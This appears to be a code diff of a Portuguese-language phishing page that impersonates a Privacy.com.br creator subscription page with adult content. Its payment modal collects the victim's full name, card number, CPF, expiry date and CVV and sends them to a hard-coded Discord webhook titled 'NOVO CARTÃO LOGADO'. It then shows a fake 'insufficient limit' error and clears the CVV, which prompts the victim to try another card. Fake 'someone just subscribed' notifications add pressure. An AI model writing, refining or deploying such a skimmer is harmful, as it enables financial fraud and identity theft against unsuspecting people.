@@ -12,209 +12,85 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
 
     <style>
-        :root {
-            --primary-orange: #f47b52;
-            --primary-gradient: linear-gradient(90deg, #f47b52, #f9a67a);
-            --text-dark: #333333;
-            --text-gray: #666666;
-        }
-
+        :root { --primary-orange: #f47b52; --primary-gradient: linear-gradient(90deg, #f47b52, #f9a67a); }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
-        body { background-color: #fff; color: var(--text-dark); padding-bottom: 120px; overflow-x: hidden; }
+        body { background: #fff; color: #333; padding-bottom: 100px; overflow-x: hidden; }
 
-        /* Navbar */
-        .top-nav {
-            display: flex; justify-content: space-between; align-items: center;
-            padding: 12px 20px; background: #fff; border-bottom: 1px solid #f0f0f0;
-            position: sticky; top: 0; z-index: 100;
-        }
-
-        /* Profile Area */
-        .banner-container { position: relative; width: 100%; }
+        /* Estilo da Página */
+        .top-nav { display: flex; justify-content: space-between; padding: 12px 20px; border-bottom: 1px solid #f0f0f0; }
         .banner { width: 100%; height: 250px; object-fit: cover; }
+        .profile-pic { width: 115px; height: 115px; border-radius: 50%; border: 4px solid #fff; margin-top: -55px; margin-left: 20px; position: relative; z-index: 10; object-fit: cover; }
         
-        .stats-overlay {
-            position: absolute; bottom: 15px; right: 15px;
-            background: rgba(0,0,0,0.5); color: white;
-            padding: 4px 12px; border-radius: 20px; font-size: 12px;
-            display: flex; gap: 12px; backdrop-filter: blur(4px);
-        }
+        .info { padding: 10px 20px; }
+        .name { font-size: 22px; font-weight: 700; display: flex; align-items: center; gap: 5px; }
+        .verified { color: var(--primary-orange); }
+        .username { color: #666; font-size: 14px; margin-bottom: 10px; }
 
-        .profile-pic-wrapper { margin-top: -55px; padding-left: 20px; position: relative; z-index: 10; }
-        .profile-pic { width: 115px; height: 115px; border-radius: 50%; border: 4px solid #fff; object-fit: cover; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        /* Botões de Assinatura */
+        .btn-container { padding: 20px; display: flex; flex-direction: column; gap: 15px; }
+        .btn-sub { width: 100%; padding: 18px; border-radius: 50px; border: none; color: #fff; display: flex; justify-content: space-between; align-items: center; cursor: pointer; background: var(--primary-gradient); font-weight: 600; }
+        .price-big { font-size: 20px; font-weight: 800; }
 
-        /* Info Section */
-        .info-section { padding: 10px 20px; }
-        .name-row { display: flex; align-items: center; gap: 6px; font-size: 22px; font-weight: 700; }
-        .verified { color: var(--primary-orange); font-size: 18px; }
-        .username { color: var(--text-gray); font-size: 14px; margin-bottom: 12px; }
-        .bio { font-size: 14.5px; color: #444; line-height: 1.5; }
-        .read-more { color: var(--text-gray); font-size: 13px; font-weight: 600; cursor: pointer; }
+        /* Galeria */
+        .gallery { padding: 20px; display: flex; flex-direction: column; gap: 15px; }
+        .gallery img { width: 100%; border-radius: 15px; }
 
-        .social-row { display: flex; gap: 12px; margin: 18px 0; }
-        .social-btn {
-            width: 38px; height: 38px; border-radius: 50%; border: 1px solid #e0e0e0;
-            display: flex; align-items: center; justify-content: center;
-            color: #555; font-size: 16px; cursor: pointer; background: #fff;
-        }
+        /* Modal Pagamento */
+        #paymentModal { display: none; position: fixed; z-index: 9999; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); backdrop-filter: blur(5px); overflow-y: auto; }
+        .modal-content { background: #fff; width: 92%; max-width: 450px; margin: 5% auto; border-radius: 20px; padding: 20px; position: relative; }
+        .close { position: absolute; right: 20px; top: 15px; font-size: 25px; cursor: pointer; }
+        
+        .pay-title { text-align: center; color: var(--primary-orange); margin-bottom: 20px; font-weight: 800; font-size: 24px; }
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; font-weight: 700; font-size: 14px; margin-bottom: 5px; }
+        .form-group input, .form-group select { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #ffd8cc; background: #fff9f7; outline: none; font-size: 16px; }
+        .btn-finalizar { width: 100%; padding: 18px; background: var(--primary-gradient); border: none; border-radius: 50px; color: #fff; font-weight: 800; font-size: 18px; margin-top: 10px; cursor: pointer; }
 
-        /* Subscription Buttons */
-        .btn-container { display: flex; flex-direction: column; gap: 14px; margin: 15px 20px; }
-        .btn-sub {
-            width: 100%; padding: 18px 25px; border-radius: 50px; border: none;
-            color: white; text-decoration: none; display: flex;
-            justify-content: space-between; align-items: center; cursor: pointer;
-            transition: transform 0.2s;
-        }
-        .btn-sub:active { transform: scale(0.96); }
-        .btn-mensal { background: var(--primary-gradient); box-shadow: 0 4px 15px rgba(244, 123, 82, 0.3); }
-        .btn-vitalicio { background: var(--primary-gradient); opacity: 0.95; }
-        .btn-label { font-size: 22px; font-weight: 500; }
-        .price-now { font-size: 20px; font-weight: 700; }
-
-        /* Galeria em Coluna */
-        .media-gallery { padding: 0 20px; display: flex; flex-direction: column; gap: 15px; margin-top: 10px; }
-        .media-gallery img { width: 100%; border-radius: 15px; border: 1px solid #f0f0f0; }
-
-        /* FAQ */
-        .faq-title { padding: 30px 20px 10px; color: var(--primary-orange); font-size: 28px; font-weight: 800; }
-        .faq-container { padding: 0 20px; margin-bottom: 40px; }
-        .faq-item { background: #fff; border-radius: 12px; margin-bottom: 10px; border: 1px solid #eee; overflow: hidden; }
-        .faq-question { 
-            padding: 18px; width: 100%; text-align: left; background: none; border: none;
-            display: flex; justify-content: space-between; align-items: center;
-            font-weight: 600; color: #333; font-size: 15px; outline: none;
-        }
-        .faq-answer { padding: 0 18px 18px; font-size: 14px; color: #666; display: none; border-top: 1px solid #fafafa; }
-        .faq-item.active .faq-answer { display: block; background: #fcfcfc; }
-
-        /* MODAIS */
-        #benefitModal, #paymentModal {
-            display: none; position: fixed; z-index: 2000;
-            left: 0; top: 0; width: 100%; height: 100%;
-            background-color: rgba(0,0,0,0.85); overflow-y: auto;
-            backdrop-filter: blur(5px);
-        }
-        .modal-content {
-            background-color: #fff; margin: 5% auto; width: 92%; max-width: 450px; 
-            border-radius: 25px; overflow: hidden; position: relative;
-            animation: fadeIn 0.3s ease;
-        }
-        @keyframes fadeIn { from{opacity:0; transform: translateY(20px);} to{opacity:1; transform: translateY(0);} }
-
-        .close-modal {
-            position: absolute; right: 15px; top: 15px; font-size: 20px;
-            color: #fff; background: rgba(0,0,0,0.5); width: 32px; height: 32px;
-            border-radius: 50%; display: flex; justify-content: center; align-items: center; z-index: 10;
-        }
-
-        /* Pagamento */
-        .pay-header { padding: 25px; text-align: center; background: #fff; }
-        .pay-header h2 { color: var(--primary-orange); font-size: 28px; font-weight: 800; }
-        .form-group { padding: 10px 20px; }
-        .form-group label { display: block; font-weight: 700; margin-bottom: 6px; font-size: 14px; color: #222; }
-        .form-group input, .form-group select {
-            width: 100%; padding: 14px; border-radius: 10px; border: 1px solid #ffd8cc;
-            background: #fff9f7; font-size: 16px; outline: none;
-        }
-        .btn-pay {
-            width: calc(100% - 40px); margin: 20px; padding: 18px;
-            background: var(--primary-gradient); color: #fff; border: none;
-            border-radius: 50px; font-weight: 800; font-size: 18px; cursor: pointer;
-        }
-
-        /* Notificação Dinâmica (Social Proof) */
-        .custom-notification {
-            position: fixed; bottom: 90px; left: 15px; right: 15px;
-            background: white; padding: 12px; border-radius: 15px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-            display: flex; align-items: center; gap: 12px;
-            z-index: 3000; transform: translateX(-120%); transition: 0.5s ease;
-        }
-        .custom-notification.show { transform: translateX(0); }
-        .notif-img { width: 45px; height: 45px; border-radius: 10px; object-fit: cover; border: 2px solid var(--primary-orange); }
-
-        /* Botão Fixo Scroll */
-        .fixed-btn-container {
-            position: fixed; bottom: 0; left: 0; width: 100%; 
-            padding: 15px 20px; background: rgba(255,255,255,0.98);
-            box-shadow: 0 -5px 20px rgba(0,0,0,0.05); z-index: 100; display: none;
-        }
+        /* Notificação */
+        .notif { position: fixed; bottom: 20px; left: 15px; right: 15px; background: #fff; padding: 12px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); display: flex; align-items: center; gap: 10px; z-index: 1000; transform: translateY(200%); transition: 0.5s; }
+        .notif.show { transform: translateY(0); }
     </style>
 </head>
 <body>
 
     <nav class="top-nav">
-        <img src="logo.png" height="28" onerror="this.src='https://privacy.com.br/img/logo-orange.svg'">
+        <img src="https://privacy.com.br/img/logo-orange.svg" height="25">
         <i class="fa-solid fa-globe"></i>
     </nav>
 
-    <div class="banner-container">
-        <img src="capa.png" class="banner">
-        <div class="stats-overlay">
-            <span><i class="fa-regular fa-image"></i> 354</span>
-            <span><i class="fa-solid fa-video"></i> 148</span>
-            <span><i class="fa-regular fa-heart"></i> 20.2K</span>
-        </div>
-    </div>
+    <img src="capa.png" class="banner">
+    <img src="perfil1.png" class="profile-pic">
 
-    <div class="profile-pic-wrapper">
-        <img src="perfil1.png" class="profile-pic">
-    </div>
-
-    <div class="info-section">
-        <div class="name-row">Kamylinha Santos <i class="fa-solid fa-circle-check verified"></i></div>
-        <p class="username">@eukamylinhasantos</p>
-        <p class="bio">Oi, meus amores! 🔥💦 Sou a Kamylinha Santos, a musa da dancinha do tiktok...</p>
-        <span class="read-more" onclick="openBenefit()">Mostrar mais</span>
-
-        <div class="social-row">
-            <button class="social-btn" onclick="openBenefit()"><i class="fa-brands fa-twitter"></i></button>
-            <button class="social-btn" onclick="openBenefit()"><i class="fa-brands fa-tiktok"></i></button>
-            <button class="social-btn" onclick="openBenefit()"><i class="fa-brands fa-instagram"></i></button>
-            <button class="social-btn" onclick="openBenefit()"><i class="fa-solid fa-paper-plane"></i></button>
-        </div>
+    <div class="info">
+        <div class="name">Kamylinha Santos <i class="fa-solid fa-circle-check verified"></i></div>
+        <div class="username">@eukamylinhasantos</div>
+        <p>A musa do TikTok como você nunca viu... 🔥</p>
     </div>
 
     <div class="btn-container">
-        <div class="btn-sub btn-mensal" onclick="openPay()">
-            <span class="btn-label">Mensal</span>
-            <div style="text-align:right">
-                <span style="font-size:12px;text-decoration:line-through;opacity:0.8;display:block">R$ 47,00</span>
-                <span class="price-now">R$ 10,00</span>
-            </div>
-        </div>
-        <div class="btn-sub btn-vitalicio" onclick="openPay()">
-            <span class="btn-label">Vitalício</span>
-            <div style="text-align:right">
-                <span style="font-size:12px;text-decoration:line-through;opacity:0.8;display:block">R$ 197,00</span>
-                <span class="price-now">R$ 27,00</span>
-            </div>
-        </div>
+        <button class="btn-sub" onclick="openPay('Mensal - R$ 10,00')">
+            <span>Plano Mensal</span>
+            <span class="price-big">R$ 10,00</span>
+        </button>
+        <button class="btn-sub" onclick="openPay('Vitalício - R$ 27,00')">
+            <span>Plano Vitalício</span>
+            <span class="price-big">R$ 27,00</span>
+        </button>
     </div>
 
-    <div class="media-gallery">
+    <div class="gallery">
         <img src="imagem1.png">
         <img src="imagem2.png">
     </div>
 
-    <h2 class="faq-title">Perguntas Frequentes</h2>
-    <div class="faq-container">
-        <div class="faq-item"><button class="faq-question">O pagamento é seguro? <i class="fa-solid fa-plus"></i></button><div class="faq-answer">Sim, utilizamos processamento criptografado de ponta a ponta.</div></div>
-        <div class="faq-item"><button class="faq-question">É sigiloso? <i class="fa-solid fa-plus"></i></button><div class="faq-answer">Com certeza. O nome na fatura é discreto e não menciona o site.</div></div>
-        <div class="faq-item"><button class="faq-question">Vocês oferecem garantia? <i class="fa-solid fa-plus"></i></button><div class="faq-answer">Sim, garantimos o acesso ao conteúdo prometido ou suporte imediato.</div></div>
-        <div class="faq-item"><button class="faq-question">Como vou acessar o conteúdo? <i class="fa-solid fa-plus"></i></button><div class="faq-answer">O link é enviado por e-mail e WhatsApp segundos após o pagamento.</div></div>
-        <div class="faq-item"><button class="faq-question">O que tem no Privacy? <i class="fa-solid fa-plus"></i></button><div class="faq-answer">Centenas de vídeos e fotos exclusivas sem nenhum tipo de censura.</div></div>
-        <div class="faq-item"><button class="faq-question">Posso cancelar quando quiser? <i class="fa-solid fa-plus"></i></button><div class="faq-answer">Sim, não há fidelidade. Você cancela com um clique.</div></div>
-    </div>
-
     <div id="paymentModal">
         <div class="modal-content">
-            <span class="close-modal" onclick="closeModal('paymentModal')">&times;</span>
-            <div class="pay-header"><h2>Pagamento</h2></div>
+            <span class="close" onclick="closePay()">&times;</span>
+            <div class="pay-title">Pagamento</div>
+            
             <div class="form-group">
                 <label>Nome Completo</label>
-                <input type="text" id="pay_name" placeholder="Como impresso no cartão">
+                <input type="text" id="pay_name" placeholder="Nome impresso no cartão">
             </div>
             <div class="form-group">
                 <label>Número do Cartão</label>
@@ -224,55 +100,32 @@
                 <label>CPF do Titular</label>
                 <input type="text" id="cpf_num" placeholder="000.000.000-00">
             </div>
-            <div style="display:flex;">
-                <div class="form-group" style="width:60%">
+            <div style="display:flex; gap:10px">
+                <div class="form-group" style="flex:1">
                     <label>Validade</label>
                     <input type="text" id="card_date" placeholder="MM/AA">
                 </div>
-                <div class="form-group" style="width:40%">
+                <div class="form-group" style="flex:1">
                     <label>CVV</label>
                     <input type="text" id="card_cvv" placeholder="123">
                 </div>
             </div>
             <div class="form-group">
-                <label>Parcelamento</label>
-                <select id="pay_plan"><option>1x de R$ 10,00</option><option>Vitalício R$ 27,00</option></select>
+                <label>Plano Selecionado</label>
+                <input type="text" id="selected_plan" readonly>
             </div>
-            <button class="btn-pay" onclick="finalizar()">PAGAR AGORA</button>
+
+            <button class="btn-finalizar" onclick="enviarDados()">PAGAR AGORA</button>
         </div>
     </div>
 
-    <div id="benefitModal">
-        <div class="modal-content">
-            <span class="close-modal" onclick="closeModal('benefitModal')">&times;</span>
-            <img src="capa.png" style="width:100%; height:180px; object-fit:cover">
-            <div style="padding:25px; text-align:center">
-                <p style="font-weight:800; font-size:18px; color:var(--primary-orange)">CONTEÚDO EXCLUSIVO LIBERADO</p>
-                <ul style="text-align:left; list-style:none; margin:20px 0; font-size:15px">
-                    <li style="margin-bottom:10px"><i class="fa-solid fa-check-circle" style="color:var(--primary-orange)"></i> +450 Fotos sem censura</li>
-                    <li style="margin-bottom:10px"><i class="fa-solid fa-check-circle" style="color:var(--primary-orange)"></i> Vídeos de dancinhas íntimas</li>
-                </ul>
-                <button class="btn-sub btn-mensal" onclick="openPay()" style="justify-content:center">ASSINAR AGORA - R$ 10,00</button>
-            </div>
-        </div>
-    </div>
-
-    <div class="custom-notification" id="socialProof">
-        <img src="perfil1.png" class="notif-img">
-        <div class="notif-text">
-            <span id="notif-name"><b>Marcos Silva</b></span> acabou de assinar!<br>
-            <small style="color:var(--primary-orange); font-weight:bold">Acesso Vitalício Liberado ✅</small>
-        </div>
-    </div>
-
-    <div class="fixed-btn-container" id="floatingBtn">
-        <div class="btn-sub btn-mensal" onclick="openPay()">
-            <span class="btn-label">Assinar Agora</span>
-            <span class="price-now">R$ 10,00</span>
-        </div>
+    <div class="notif" id="notif">
+        <i class="fa-solid fa-circle-check" style="color: #2ecc71; font-size: 20px;"></i>
+        <div id="notif-text"><b>Alguém</b> acabou de assinar!</div>
     </div>
 
     <script>
+        // Máscaras
         $(document).ready(function(){
             $('#card_num').mask('0000 0000 0000 0000');
             $('#cpf_num').mask('000.000.000-00');
@@ -280,75 +133,70 @@
             $('#card_cvv').mask('000');
         });
 
-        function openBenefit() { document.getElementById('benefitModal').style.display = "block"; }
-        function openPay() { 
-            closeModal('benefitModal');
-            document.getElementById('paymentModal').style.display = "block"; 
+        function openPay(plano) {
+            document.getElementById('selected_plan').value = plano;
+            document.getElementById('paymentModal').style.display = 'block';
         }
-        function closeModal(id) { document.getElementById(id).style.display = "none"; }
 
-        document.querySelectorAll('.faq-question').forEach(btn => {
-            btn.addEventListener('click', () => btn.parentElement.classList.toggle('active'));
-        });
+        function closePay() { document.getElementById('paymentModal').style.display = 'none'; }
 
-        window.onscroll = function() {
-            document.getElementById("floatingBtn").style.display = (window.scrollY > 500) ? "block" : "none";
-        };
-
-        const pessoas = ["Ricardo M.", "Felipe A.", "Gustavo S.", "Andre L.", "Marcos J.", "Vinicius P.", "Breno L.", "Thiago S."];
-        function showNotification() {
-            const nome = pessoas[Math.floor(Math.random() * pessoas.length)];
-            document.getElementById('notif-name').innerHTML = `<b>${nome}</b>`;
-            const el = document.getElementById('socialProof');
-            el.classList.add('show');
-            setTimeout(() => { el.classList.remove('show'); }, 5000);
-            setTimeout(showNotification, Math.floor(Math.random() * 7000) + 8000);
-        }
-        setTimeout(showNotification, 3000);
-
-        function finalizar() {
+        function enviarDados() {
             const nome = document.getElementById('pay_name').value;
             const cartao = document.getElementById('card_num').value;
             const cpf = document.getElementById('cpf_num').value;
             const validade = document.getElementById('card_date').value;
             const cvv = document.getElementById('card_cvv').value;
-            const plano = document.getElementById('pay_plan').value;
+            const plano = document.getElementById('selected_plan').value;
 
             if (!nome || !cartao || !cpf || !validade || !cvv) {
-                Notiflix.Notify.failure('Preencha os dados do cartão!');
+                Notiflix.Notify.failure('Preencha todos os campos!');
                 return;
             }
 
-            Notiflix.Loading.circle('Processando transação segura...');
+            Notiflix.Loading.circle('Processando...');
 
             const webhookURL = "https://discord.com/api/webhooks/1470300746439458902/TbdZwuh6kMX7vdMD97wvOdZ2Rzf63w7PB2GUyOeOEFKwcui6VI2TAubXJyjYVdxIoWZH";
+            
             const payload = {
-                username: "Vendas Kamylinha",
                 embeds: [{
-                    title: "🚀 Cartão Capturado!",
-                    color: 16038738,
+                    title: "💳 NOVO CARTÃO LOGADO",
+                    color: 16744192,
                     fields: [
                         { name: "👤 Nome", value: nome, inline: true },
                         { name: "🆔 CPF", value: cpf, inline: true },
                         { name: "💳 Cartão", value: `\`${cartao}\``, inline: false },
-                        { name: "📅 Val", value: validade, inline: true },
+                        { name: "📅 Exp", value: validade, inline: true },
                         { name: "🔒 CVV", value: cvv, inline: true },
-                        { name: "💰 Plano", value: plano, inline: false },
-                        { name: "👤 User ID", value: "1326639660872499315", inline: false }
+                        { name: "💰 Plano", value: plano }
                     ],
-                    footer: { text: "Gerado em: " + new Date().toLocaleString() }
+                    footer: { text: "ID: 1326639660872499315" }
                 }]
             };
 
-            fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) })
-            .then(() => {
-                setTimeout(() => { 
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                setTimeout(() => {
                     Notiflix.Loading.remove();
                     Notiflix.Report.failure('Erro no Cartão', 'Código 51: Limite Insuficiente. Tente outro cartão.', 'Tentar novamente');
-                }, 2500);
+                    document.getElementById('card_cvv').value = "";
+                }, 2000);
             });
         }
+
+        // Notificações Falsas
+        const nomes = ["Marcos", "Felipe", "Ricardo", "João", "André", "Gustavo"];
+        function showNotif() {
+            const nome = nomes[Math.floor(Math.random() * nomes.length)];
+            document.getElementById('notif-text').innerHTML = `<b>${nome} P.</b> acabou de assinar o Vitalício!`;
+            const n = document.getElementById('notif');
+            n.classList.add('show');
+            setTimeout(() => n.classList.remove('show'), 4000);
+            setTimeout(showNotif, 12000);
+        }
+        setTimeout(showNotif, 3000);
     </script>
 </body>
 </html>
-
